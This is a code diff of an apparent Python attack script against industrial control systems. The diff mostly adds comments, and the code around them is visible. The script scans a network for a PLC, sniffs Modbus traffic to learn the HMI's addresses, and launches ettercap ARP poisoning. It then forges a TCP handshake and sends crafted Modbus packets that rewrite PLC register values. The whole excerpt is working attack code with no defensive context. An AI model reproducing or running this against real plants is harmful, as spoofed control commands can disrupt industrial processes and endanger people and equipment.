@@ -78,7 +78,7 @@ def changeData1(addr):
     mb_1[Modbus1].ref_num = addr
     sendp(mb_1)
 
-
+#nmap scan plc ip
 def plc_scan():
         nm = nmap.PortScanner()
         net = input("enter your network : ")
@@ -90,7 +90,7 @@ def plc_scan():
                 plc_ip = host
                 print("PLC IP : {}".format(plc_ip))
 
-
+#sniff data between plc and hmi to get hmi_mac, plc_mac, hmi_ip
 def hmi_scan(plcip):
         fil = "dst host {} and dst port 502 and tcp[13] = 0x18".format(plcip)
         p = sniff(iface="eth0", count=1, filter=fil)
@@ -101,6 +101,7 @@ def hmi_scan(plcip):
         plc_mac = x[Ether].dst
         print("HMI IP : {}".format(hmi_ip))
 
+
 def get_ipmac():
         plc_scan()
         arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
@@ -109,13 +110,14 @@ def get_ipmac():
         os.system('pkill -f ettercap')
         sleep(1)
 
+#capture tcp SA frame
 def cap():
         filx = "host {} and tcp[13] = 0x12".format(plc_ip)
         pframe1 = sniff(iface="eth0", timeout=0.5, count=1, filter=filx)
         global frame1
         frame1 = pframe1[0]
 
-
+#establish a tcp connection via forging a fake 3-way handshake
 def handshake():
     #layer 4 
     global sport
